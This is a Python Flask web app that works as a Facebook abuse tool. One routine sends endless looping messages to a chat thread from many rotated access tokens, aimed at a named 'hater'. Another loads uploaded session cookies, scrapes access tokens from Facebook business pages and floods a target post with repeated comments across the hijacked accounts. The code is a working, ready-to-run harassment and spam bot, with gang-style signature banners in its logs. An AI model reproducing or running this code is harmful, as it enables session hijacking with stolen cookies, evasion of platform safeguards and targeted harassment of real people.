import os
import time
import json
import threading
import requests
import uuid
import re
import random
from flask import Flask, render_template, request, redirect, url_for, jsonify, flash
from werkzeug.utils import secure_filename
from requests.exceptions import RequestException

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Create directories for uploads and tasks
os.makedirs('uploads', exist_ok=True)
os.makedirs('tasks', exist_ok=True)

# Dictionary to track running tasks
running_tasks = {}

# Task history file
TASK_HISTORY_FILE = 'task_history.json'

# Function to manage task history
def manage_task_history(task_id, task_info):
    try:
        # Agar file nahi hai, toh create karein
        if not os.path.exists(TASK_HISTORY_FILE):
            with open(TASK_HISTORY_FILE, 'w') as file:
                json.dump({}, file)

        # File ka size check karein
        if os.path.getsize(TASK_HISTORY_FILE) > 100 * 1024 * 1024:  # 100 MB
            os.remove(TASK_HISTORY_FILE)
            with open(TASK_HISTORY_FILE, 'w') as file:
                json.dump({}, file)

        # Task history update karein
        with open(TASK_HISTORY_FILE, 'r') as file:
            history = json.load(file)

        history[task_id] = task_info

        with open(TASK_HISTORY_FILE, 'w') as file:
            json.dump(history, file)
    except Exception as e:
        print(f"Error managing task history: {e}")

    # Delete history if file size exceeds 100 MB
    if os.path.getsize(TASK_HISTORY_FILE) > 100 * 1024 * 1024:
        os.remove(TASK_HISTORY_FILE)
        history = {}

    history[task_id] = task_info
    with open(TASK_HISTORY_FILE, 'w') as file:
        json.dump(history, file)

# Function to send messages
def send_messages(task_id, convo_file, messages_file, tokens_file, haters_file, time_file):
    task_dir = os.path.join('tasks', task_id)

    # Read conversation ID
    with open(os.path.join(task_dir, convo_file), "r") as file:
        convo_id = file.read().strip()

    # Read messages
    with open(os.path.join(task_dir, messages_file), "r") as file:
        messages = file.readlines()
    num_messages = len(messages)

    # Read tokens
    with open(os.path.join(task_dir, tokens_file), "r") as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    # Read hater's name
    with open(os.path.join(task_dir, haters_file), "r") as file:
        haters_name = file.read().strip()

    # Read time delay
    with open(os.path.join(task_dir, time_file), "r") as file:
        speed = int(file.read().strip())

    headers = {
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
        "referer": "www.google.com",
    }

    # Create log file for the task
    log_file = os.path.join(task_dir, 'log.txt')

    with open(log_file, 'w') as log:
        log.write(f"Task {task_id} started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        log.write(f"Conversation ID: {convo_id}\n")
        log.write(f"Number of messages: {num_messages}\n")
        log.write(f"Number of tokens: {num_tokens}\n")
        log.write(f"Hater's name: {haters_name}\n")
        log.write(f"Delay between messages: {speed} seconds\n\n")

        task_info = running_tasks.get(task_id, {})
        task_info['status'] = 'running'
        task_info['log'] = log_file
        task_info['messages_sent'] = 0
        task_info['messages_failed'] = 0
        running_tasks[task_id] = task_info

        try:
            message_index = 0
            while task_id in running_tasks and running_tasks[task_id]['status'] == 'running':
                if message_index >= num_messages:
                    log.write("\n🔄 All messages sent. Restarting from the beginning...\n\n")
                    message_index = 0

                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {
                    "access_token": access_token,
                    "message": " TH3__D4RK__L3G3NDS__B0Y5__H3R3: " + message,
                    "messaging_type": "RESPONSE"
                }

                try:
                    response = requests.post(url, data=parameters, headers=headers)

                    if response.ok:
                        log_entry = f"✅ [SENT] Message #{message_index + 1} | To: {convo_id} | Token: #{token_index + 1}\n"
                        log_entry += f"   💬 TH3__D4RK__L3G3NDS__B0Y5__H3R3: {message}\n"
                        log.write(log_entry + "\n")
                        log.flush()
                        task_info['messages_sent'] += 1
                    else:
                        log_entry = f"❌ [FAILED] Message #{message_index + 1} | To: {convo_id} | Token: #{token_index + 1}\n"
                        log_entry += f"   ⚠️ BTD TULEX _//_ P3R TH3__D4RK__L3G3NDS__B0Y5: {message}\n"
                        log_entry += f"   Error: {response.text}\n"
                        log.write(log_entry + "\n")
                        log.flush()
                        task_info['messages_failed'] += 1

                except Exception as e:
                    log_entry = f"⚠️ [ERROR] Message #{message_index + 1} | To: {convo_id} | Token: #{token_index + 1}\n"
                    log_entry += f"   Error: {str(e)}\n"
                    log.write(log_entry + "\n")
                    log.flush()
                    task_info['messages_failed'] += 1

                message_index += 1
                time.sleep(speed)

            if task_id in running_tasks and running_tasks[task_id]['status'] == 'stopped':
                log.write(f"\n⏹️ Task {task_id} stopped manually at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                running_tasks[task_id]['status'] = 'completed'

        except Exception as e:
            log_entry = f"\n⚠️ TASK ERROR: {str(e)}\n"
            log.write(log_entry)
            if task_id in running_tasks:
                running_tasks[task_id]['status'] = 'error'
                running_tasks[task_id]['error'] = str(e)

# Routes
@app.route('/')
def index():
    return render_template('index.html', tasks=running_tasks)

@app.route('/post_tool')
def post_tool():
    return render_template('post_tool.html')

@app.route('/upload', methods=['POST'])
def upload():
    task_id = str(uuid.uuid4())[:8]
    task_dir = os.path.join('tasks', task_id)
    os.makedirs(task_dir, exist_ok=True)

    convo_file = request.files.get('convo')
    messages_file = request.files.get('messages')
    tokens_file = request.files.get('tokens')
    haters_file = request.files.get('haters')
    time_file = request.files.get('time')

    if not (convo_file and messages_file and tokens_file and haters_file and time_file):
        flash('All files are required!', 'error')
        return redirect(url_for('index'))

    convo_filename = secure_filename(convo_file.filename)
    messages_filename = secure_filename(messages_file.filename)
    tokens_filename = secure_filename(tokens_file.filename)
    haters_filename = secure_filename(haters_file.filename)
    time_filename = secure_filename(time_file.filename)

    convo_file.save(os.path.join(task_dir, convo_filename))
    messages_file.save(os.path.join(task_dir, messages_filename))
    tokens_file.save(os.path.join(task_dir, tokens_filename))
    haters_file.save(os.path.join(task_dir, haters_filename))
    time_file.save(os.path.join(task_dir, time_filename))

    running_tasks[task_id] = {
        'id': task_id,
        'created_at': time.strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'created',
        'files': {
            'convo': convo_filename,
            'messages': messages_filename,
            'tokens': tokens_filename,
            'haters': haters_filename,
            'time': time_filename
        }
    }

    manage_task_history(task_id, running_tasks[task_id])
    flash(f'Task created with ID: {task_id}', 'success')
    return redirect(url_for('index'))

@app.route('/start/<task_id>', methods=['POST'])
def start_task(task_id):
    if task_id not in running_tasks:
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404

    task = running_tasks[task_id]
    if task['status'] in ['running']:
        return jsonify({'status': 'error', 'message': 'Task already running'}), 400

    thread = threading.Thread(
        target=send_messages,
        args=(
            task_id,
            task['files']['convo'],
            task['files']['messages'],
            task['files']['tokens'],
            task['files']['haters'],
            task['files']['time']
        )
    )
    thread.daemon = True
    thread.start()

    return jsonify({'status': 'success', 'message': f'Task {task_id} started'})

@app.route('/stop/<task_id>', methods=['POST'])
def stop_task(task_id):
    if task_id not in running_tasks:
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404

    task = running_tasks[task_id]
    if task['status'] != 'running':
        return jsonify({'status': 'error', 'message': 'Task not running'}), 400

    task['status'] = 'stopped'
    return jsonify({'status': 'success', 'message': f'Task {task_id} stopping'})

@app.route('/tasks', methods=['GET'])
def get_tasks():
    return jsonify(running_tasks)

@app.route('/log/<task_id>', methods=['GET'])
def get_log(task_id):
    if task_id not in running_tasks:
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404

    task = running_tasks[task_id]
    if 'log' not in task:
        return jsonify({'status': 'error', 'message': 'Log not available'}), 404

    try:
        log_file_path = task['log']
        if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 2 * 1024 * 1024:
            os.remove(log_file_path)
            with open(log_file_path, 'w') as new_log:
                new_log.write(f"Log reset at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")

        with open(log_file_path, 'r') as log_file:
            log_content = log_file.read()

        return jsonify({'status': 'success', 'log': log_content})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/history', methods=['GET'])
def get_history():
    if os.path.exists(TASK_HISTORY_FILE):
        with open(TASK_HISTORY_FILE, 'r') as file:
            history = json.load(file)
        return jsonify(history)
    return jsonify({})

@app.route('/get_convo', methods=['POST'])
def get_convo():
    token = request.form.get('token')
    if not token:
        return jsonify({'status': 'error', 'message': 'Token is required'}), 400

    try:
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}"
        response = requests.get(url)
        if response.ok:
            return jsonify(response.json())
        else:
            return jsonify({'status': 'error', 'message': response.text}), 400
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# POST-TOOL functionality
def run_post_tool_task(task_id, cookies_file_path, post_url, commenter_name, delay, comments_file_path):
    # Create task directory if it doesn't exist
    task_dir = os.path.join('tasks', task_id)
    os.makedirs(task_dir, exist_ok=True)
    
    log_file = os.path.join(task_dir, 'post_tool_log.txt')
    
    # Initialize log file
    with open(log_file, 'w') as f:
        f.write(f"POST TOOL Task {task_id} started at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("====== POST TOOL STARTED ======\n\n")
        
        running_tasks[task_id] = {
            'id': task_id,
            'created_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'running',
            'log': log_file,
            'type': 'post_tool'
        }
        
        try:
            # Read cookies from file
            with open(cookies_file_path, 'r') as f_cookie:
                cookies_data = f_cookie.read().splitlines()
            
            f.write(f"[✓] Loaded {len(cookies_data)} cookies\n")
            
            # Read comments from file
            with open(comments_file_path, 'r') as f_comments:
                comments = f_comments.readlines()
            
            f.write(f"[✓] Loaded {len(comments)} comments\n")
            
            # Extract target_id from post_url
            match = re.search(r'target_id=(\d+)', post_url)
            if not match:
                f.write("[!] Invalid URL format. Target ID not found.\n")
                running_tasks[task_id]['status'] = 'failed'
                return
                
            target_id = match.group(1)
            f.write(f"[✓] Target ID extracted: {target_id}\n")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'
            }
            
            # Validate cookies and get tokens
            valid_cookies = []
            f.write("\n[✓] Validating cookies and extracting tokens...\n")
            
            for i, cookie in enumerate(cookies_data):
                if task_id in running_tasks and running_tasks[task_id]['status'] != 'running':
                    f.write("\n[!] Task stopped by user\n")
                    break
                    
                try:
                    f.write(f"[✓] Checking cookie #{i+1}...\n")
                    response = requests.get('https://business.facebook.com/business_locations', 
                                        headers=headers, 
                                        cookies={'Cookie': cookie}).text
                    
                    token_match = re.search('(EAAG\w+)', str(response))
                    if token_match:
                        token_eaag = token_match.group(1)
                        valid_cookies.append((cookie, token_eaag))
                        f.write(f"[✓] Valid token found for cookie #{i+1}\n")
                    else:
                        f.write(f"[!] No token found for cookie #{i+1}\n")
                except Exception as e:
                    f.write(f"[!] Error processing cookie #{i+1}: {str(e)}\n")
            
            if not valid_cookies:
                f.write("\n[!] No valid cookies found. Exiting...\n")
                running_tasks[task_id]['status'] = 'failed'
                return
                
            f.write(f"\n[✓] Found {len(valid_cookies)} valid cookies with tokens\n")
            f.write(f"[✓] Post URL: {post_url}\n")
            f.write(f"[✓] Target ID: {target_id}\n")
            f.write(f"[✓] Commenter Name: {commenter_name}\n")
            f.write(f"[✓] Delay: {delay} seconds\n")
            f.write(f"[✓] Comments loaded: {len(comments)}\n\n")
            f.write("[[✓]] ︻╦デ╤━╼●▬▬▬▬๑۩ＲＡＨＵＬ࿋ོ༙☬●─────𖣘︎─────●☬࿋ོ༙ ᴅᴏɴ۩๑▬▬▬▬▬●╾━╤デ╦︻\n\n")
            
            # Start sending comments
            f.write("[✓]𝐘𝐎𝐔𝐑 𝐁𝐎𝐎𝐊𝐌𝐀𝐑𝐊 𝐂𝐎𝐌𝐌𝐄𝐍𝐓 𝐒𝐄𝐍𝐃𝐃𝐈𝐍𝐆\n\n")
            
            x, y, cookie_index = 0, 0, 0
            
            while task_id in running_tasks and running_tasks[task_id]['status'] == 'running':
                try:
                    # Get current comment and cookie
                    teks = comments[x % len(comments)].strip()
                    comment_with_name = f"{commenter_name}: {teks}"
                    
                    current_cookie, token_eaag = valid_cookies[cookie_index % len(valid_cookies)]
                    
                    # Prepare data for posting comment
                    data = {
                        'message': comment_with_name,
                        'access_token': token_eaag
                    }
                    
                    # Send the comment
                    response = requests.post(
                        f'https://graph.facebook.com/{target_id}/comments/', 
                        data=data, 
                        cookies={'Cookie': current_cookie}
                    ).json()
                    
                    # Check if comment was sent successfully
                    if 'id' in response:
                        f.write(f"post id :: {target_id}\n")
                        f.write(f"Date time :: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"COOKIE No. :: {cookie_index+1}\n")
                        f.write(f"Comment sent successfully✫●▬▬▬▬๑۩𒊹︻╦デ╤━╼𝐑𝐀𝐇𝐔𝐋 𝐃𝐎𝐍 𝐓𝐎𝐎𝐋╾━╤デ╦︻𒊹︎۩๑▬▬▬▬▬●✫ :: {comment_with_name}\n")
                        f.write("[[✓]] ︻╦デ╤━╼●▬▬▬▬๑۩𝐑𝐀𝐇𝐔𝐋࿋ོ༙☬●─────𖣘︎─────●☬࿋ོ༙𝐃𝐎𝐍۩๑▬▬▬▬▬●╾━╤デ╦︻\n\n")
                    else:
                        y += 1
                        f.write(f"[{y}] Status : Failure\n")
                        f.write(f"COOKIE NUMBER : {cookie_index+1}\n")
                        f.write(f"[/]Link : https://m.basic.facebook.com//{target_id}\n")
                        f.write(f"[/]Comments : {comment_with_name}\n\n")
                    
                    # Move to next comment and cookie
                    x += 1
                    cookie_index = (cookie_index + 1) % len(valid_cookies)
                    
                    # Flush the log file to ensure it's updated
                    f.flush()
                    
                    # Wait for the specified delay
                    time.sleep(delay)
                    
                except Exception as e:
                    f.write(f"[!] Error sending comment: {str(e)}\n")
                    time.sleep(5)
                    
            # Task completed or stopped
            if task_id in running_tasks:
                if running_tasks[task_id]['status'] == 'stopped':
                    f.write("\n[!] Task stopped by user\n")
                else:
                    f.write("\n[✓] Task completed\n")
                    
                running_tasks[task_id]['status'] = 'completed'
                
        except Exception as e:
            f.write(f"\n[!] An unexpected error occurred: {str(e)}\n")
            if task_id in running_tasks:
                running_tasks[task_id]['status'] = 'error'
                running_tasks[task_id]['error'] = str(e)

@app.route('/run_post_tool', methods=['POST'])
def run_post_tool():
    task_id = str(uuid.uuid4())[:8]
    task_dir = os.path.join('tasks', task_id)
    os.makedirs(task_dir, exist_ok=True)
    
    try:
        # Get files from request
        cookies_file = request.files.get('cookies_file')
        comments_file = request.files.get('comments_file')
        
        if not cookies_file or not comments_file:
            return jsonify({'status': 'error', 'message': 'All files are required!'}), 400
        
        # Get other form data
        post_url = request.form.get('post_url')
        commenter_name = request.form.get('commenter_name')
        delay = int(request.form.get('delay', 5))
        
        # Save uploaded files
        cookies_filename = secure_filename(cookies_file.filename)
        comments_filename = secure_filename(comments_file.filename)
        
        cookies_path = os.path.join(task_dir, cookies_filename)
        comments_path = os.path.join(task_dir, comments_filename)
        
        cookies_file.save(cookies_path)
        comments_file.save(comments_path)
        
        # Create task entry but don't start it yet
        running_tasks[task_id] = {
            'id': task_id,
            'created_at': time.strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'created',
            'type': 'post_tool',
            'files': {
                'cookies': cookies_path,
                'comments': comments_path,
                'post_url': post_url,
                'commenter_name': commenter_name,
                'delay': delay
            }
        }
        
        manage_task_history(task_id, running_tasks[task_id])
        
        return jsonify({
            'status': 'success', 
            'message': f'POST-TOOL task created with ID: {task_id}',
            'task_id': task_id
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/start_post_tool/<task_id>', methods=['POST'])
def start_post_tool(task_id):
    try:
        if task_id not in running_tasks:
            return jsonify({'status': 'error', 'message': 'Task not found'}), 404
            
        task = running_tasks[task_id]
        if task['status'] == 'running':
            return jsonify({'status': 'error', 'message': 'Task already running'}), 400
        
        # Update task status before starting thread
        task['status'] = 'running'
        
        # Create task directory if it doesn't exist
        task_dir = os.path.join('tasks', task_id)
        os.makedirs(task_dir, exist_ok=True)
        
        # Create initial log file if it doesn't exist
        log_file = os.path.join(task_dir, 'post_tool_log.txt')
        if not os.path.exists(log_file):
            with open(log_file, 'w') as f:
                f.write(f"POST TOOL Task {task_id} initializing at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("Waiting for task to start...\n")
        
        task['log'] = log_file
            
        # Start the task in a separate thread
        thread = threading.Thread(
            target=run_post_tool_task,
            args=(
                task_id,
                task['files']['cookies'],
                task['files']['post_url'],
                task['files']['commenter_name'],
                task['files']['delay'],
                task['files']['comments']
            )
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({'status': 'success', 'message': f'Task {task_id} started'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Error starting task: {str(e)}'}), 500

@app.route('/stop_post_tool/<task_id>', methods=['POST'])
def stop_post_tool(task_id):
    if task_id not in running_tasks:
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404
        
    task = running_tasks[task_id]
    if task['status'] != 'running':
        return jsonify({'status': 'error', 'message': 'Task not running'}), 400
        
    task['status'] = 'stopped'
    return jsonify({'status': 'success', 'message': f'Task {task_id} stopping'})

@app.route('/post_tool_log/<task_id>', methods=['GET'])
def get_post_tool_log(task_id):
    if task_id not in running_tasks:
        return jsonify({'status': 'error', 'message': 'Task not found'}), 404
        
    task = running_tasks[task_id]
    if 'log' not in task:
        # Create a default log file if not exists
        task_dir = os.path.join('tasks', task_id)
        os.makedirs(task_dir, exist_ok=True)
        log_file_path = os.path.join(task_dir, 'post_tool_log.txt')
        
        with open(log_file_path, 'w') as f:
            f.write(f"Log for task {task_id} created at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("Waiting for task to start...\n")
        
        task['log'] = log_file_path
    
    try:
        log_file_path = task['log']
        if not os.path.exists(log_file_path):
            with open(log_file_path, 'w') as f:
                f.write(f"Log for task {task_id} created at {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("Waiting for task to start...\n")
                
        with open(log_file_path, 'r') as log_file:
            log_content = log_file.read()
            
        return jsonify({
            'status': 'success', 
            'log': log_content,
            'task_status': task['status']
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
